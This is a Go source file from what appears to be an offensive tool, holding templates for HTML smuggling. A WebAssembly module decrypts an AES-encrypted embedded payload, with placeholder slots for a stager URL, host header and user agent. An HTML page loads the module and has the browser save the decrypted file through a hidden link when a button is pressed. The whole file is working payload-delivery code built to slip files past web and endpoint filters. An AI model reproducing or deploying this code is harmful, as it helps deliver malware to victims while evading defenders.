package gengo

const smuggleMain = `package main

import (
	"crypto/cipher"
	"crypto/aes"
	"encoding/base64"
	"syscall/js"
	{{.Import}}
	{{.StagerImport}}
	{{.StegImport}}
)

func pkcs5Trimming(encrypt []byte) []byte {
	padding := encrypt[len(encrypt)-1]
	return encrypt[:len(encrypt)-int(padding)]
}

func aesDecrypt(key string, buf string) ([]byte, error) {

	encKey, err := base64.StdEncoding.DecodeString(key)
	if err != nil {
		return nil, err
	}

	encBuf, err := base64.StdEncoding.DecodeString(buf)
	if err != nil {
		return nil, err
	}

	var block cipher.Block

	block, err = aes.NewCipher(encKey)
	if err != nil {
		return nil, err
	}

	if len(encBuf) < aes.BlockSize {

		return nil, nil
	}
	iv := encBuf[:aes.BlockSize]
	encBuf = encBuf[aes.BlockSize:]

	cbc := cipher.NewCBCDecrypter(block, iv)
	cbc.CryptBlocks(encBuf, encBuf)
	decBuf := pkcs5Trimming(encBuf)

	return decBuf, nil

}

{{.Extra}}


func loadImage() string {
	var img string
	{{.Url}}
	{{.HostHdr}}
	{{.Ua}}
	{{.Stager}}

	return img
}

func {{.FuncName}}(this js.Value, args []js.Value) interface{}  {

	bufstring := {{.BufStr}}
	kstring := {{.KeyStr}}

	imgbuf, err := aesDecrypt(kstring, bufstring)
	if err != nil {
		return nil
	}

	arrayConstructor := js.Global().Get("Uint8Array")
	dataJS := arrayConstructor.New(len(imgbuf))

	js.CopyBytesToJS(dataJS, imgbuf)


	return dataJS
}

func main() {
	js.Global().Set("goImage", js.FuncOf({{.FuncName}}))
	<-make(chan bool)// keep running
}

`

const htmlExample = `

<html>
<head>
<script src="wasm_exec.js"></script>
<script>
	const go = new Go();
	WebAssembly.instantiateStreaming(fetch("test_wasm.wasm"), go.importObject).then((result) => {
		go.run(result.instance);
	});
	function compImage() {
		buffer = goImage();
        var blobbed = new Blob([buffer]);
		var blobUrl=URL.createObjectURL(blobbed);
        document.getElementById("prr").hidden = !0; //div tag used for download

		aDecfile.href=blobUrl;
		aDecfile.download="{{.}}"; //modify to your desired filename.
		aDecfile.click();
	}
</script>
</head>
<body>
    <button onClick="compImage()">goSmuggle</button>
    <div id="prr"><a id=aDecfile hidden><button></button></a></div>
</body>
`
const gosrcExample = ``
